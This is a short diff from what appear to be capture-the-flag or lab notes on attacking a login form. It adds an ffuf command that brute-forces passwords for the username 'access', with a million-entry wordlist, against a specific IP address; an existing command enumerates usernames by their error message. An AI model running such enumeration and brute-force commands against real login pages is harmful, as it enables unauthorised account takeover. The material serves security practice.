@@ -68,4 +68,7 @@ post login
 
 ```
 ffuf -u "http://34.94.3.143/7b4c1c34db/secure-login/"  -d "username=FUZZ&password=a" -w "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" -fr "Invalid Username" -H 'Content-Type: application/x-www-form-urlencoded'
+
+ffuf -u "http://34.94.3.143/7b4c1c34db/secure-login/"  -d "username=access&password=FUZZ" -w "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt" -fr "Invalid Password" -H 'Content-Type: application/x-www-form-urlencoded'
+
 ```
